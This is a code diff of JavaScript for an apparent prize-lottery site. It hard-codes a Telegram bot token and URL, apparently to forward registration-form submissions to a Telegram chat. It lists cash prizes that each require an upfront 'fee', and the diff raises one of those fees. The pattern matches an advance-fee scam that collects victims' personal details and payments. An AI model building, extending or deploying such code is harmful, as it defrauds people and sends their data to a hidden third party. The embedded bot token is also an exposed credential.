@@ -1,5 +1,5 @@
 const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
-const TELEGRAM_CHAT_ID = "874563737";  // Make sure to replace this with your actual chat ID
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";  // Replace this with your actual chat ID
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 document.getElementById('registrationForm').addEventListener('submit', function(e) {
@@ -39,7 +39,7 @@ document.getElementById('registrationForm').addEventListener('submit', function(
 });
 
 const prizes = [
-    { amount: '$50,000.00', fee: '$500' },
+    { amount: '$50,000.00', fee: '$650' },
     { amount: '$100,000.00', fee: '$1000' },
     { amount: '$125,000.00', fee: '$1250' },
     { amount: '$150,000.00', fee: '$1500' },
@@ -58,6 +58,7 @@ const prizes = [
 
 let attempts = 0;
 
+// Jackpot Game Logic
 if (document.getElementById('playJackpot')) {
     document.getElementById('playJackpot').addEventListener('click', function() {
         attempts++;
@@ -72,6 +73,7 @@ if (document.getElementById('playJackpot')) {
     });
 }
 
+// Spinning Board Game Logic
 if (document.getElementById('spinButton')) {
     document.getElementById('spinButton').addEventListener('click', function() {
         const spinner = document.getElementById('spinner');
@@ -86,6 +88,7 @@ if (document.getElementById('spinButton')) {
     });
 }
 
+// Ball Scratch Game Logic
 if (document.getElementById('ballContainer')) {
     const ballContainer = document.getElementById('ballContainer');
     prizes.forEach((prize, index) => {
